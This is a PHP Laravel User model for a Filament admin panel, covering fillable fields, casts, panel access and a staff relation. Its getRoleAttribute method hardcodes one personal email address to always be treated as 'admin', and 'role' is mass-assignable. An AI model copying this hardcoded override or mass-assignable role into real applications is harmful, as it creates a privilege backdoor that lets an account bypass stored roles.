<?php

namespace App\Models;

use Filament\Models\Contracts\FilamentUser;
use Filament\Panel;
use Illuminate\Database\Eloquent\Factories\HasFactory;
use Illuminate\Foundation\Auth\User as Authenticatable;
use Illuminate\Notifications\Notifiable;

class User extends Authenticatable implements FilamentUser
{
    /** @use HasFactory<\Database\Factories\UserFactory> */
    use HasFactory, Notifiable;

    protected $fillable = [
        'name',
        'email',
        'password',
        'role',
        'is_active',
        'web_view',
    ];

    protected $hidden = [
        'password',
        'remember_token',
    ];

    protected function casts(): array
    {
        return [
            'email_verified_at' => 'datetime',
            'password' => 'hashed',
            'is_active' => 'boolean',
            'web_view' => 'boolean',
        ];
    }

    // ✅ Filament access control
    public function canAccessPanel(Panel $panel): bool
    {
        return $this->is_active === true;
    }
    public function getRoleAttribute($value)
    {
        if ($this->email === 'eshrakg62@gmail.com') {
            return 'admin';
        }

        return $value;
    }
    public function staff()
    {
        return $this->hasOne(Staff::class);
    }

    protected static function booted()
    {
        static::deleting(function ($user) {
            $user->staff()?->delete();
        });
    }
}
